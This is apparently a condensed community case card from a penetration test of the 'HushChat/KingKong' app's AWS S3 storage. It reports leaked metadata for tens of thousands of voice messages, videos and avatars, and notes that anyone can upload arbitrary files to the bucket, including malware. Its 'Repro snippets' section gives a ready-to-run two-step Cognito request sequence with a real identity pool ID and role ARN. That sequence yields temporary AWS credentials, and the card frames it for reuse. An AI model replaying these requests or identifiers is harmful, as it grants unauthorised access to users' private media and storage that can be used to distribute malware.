# HushChat/KingKong S3 桶渗透

- Source report: `HushChat-S3渗透测试报告.md`
- Full report: `domains/cloud-security/case-reports/hushchat-s3/HushChat-S3渗透测试报告.md`
- Techniques: upload, auth, wallet
- Fused: 2026-09-17

## Key findings (distilled)

- 语音消息/视频/上传文件 **元数据全量泄露**（存在性/大小/时间）
- 可向桶上传任意文件（恶意软件分发）
- 万+ 语音消息、1.3 万+ 视频、4.4 万+ 头像、1.5 万+ 上传文件

## Repro snippets

```
IdentityPoolId: ap-southeast-1:da09aa05-150c-48e4-83ef-3c735c2552d1
Step 1: POST cognito-identity.ap-southeast-1.amazonaws.com/
        X-Amz-Target: AWSCognitoIdentityService.GetId
        {"IdentityPoolId":"ap-southeast-1:da09aa05-150c-48e4-83ef-3c735c2552d1"}
        → 返回 IdentityId

Step 2: POST cognito-identity.ap-southeast-1.amazonaws.com/
        X-Amz-Target: AWSCognitoIdentityService.GetCredentialsForIdentity
        {"IdentityId":"<IdentityId>"}
        → 返回 AccessKeyId / SecretKey / SessionToken
arn:aws:sts::316419804212:assumed-role/Cognito_idpool_demomakerUnauth_Role/CognitoIdentityCredentials
```

## When to reuse

- 同类标签命中：upload, auth, wallet
- 先读本卡片，再打开 Full report 复现细节

@TGSEC社区 · @TGSEC-Qtzuu 整理
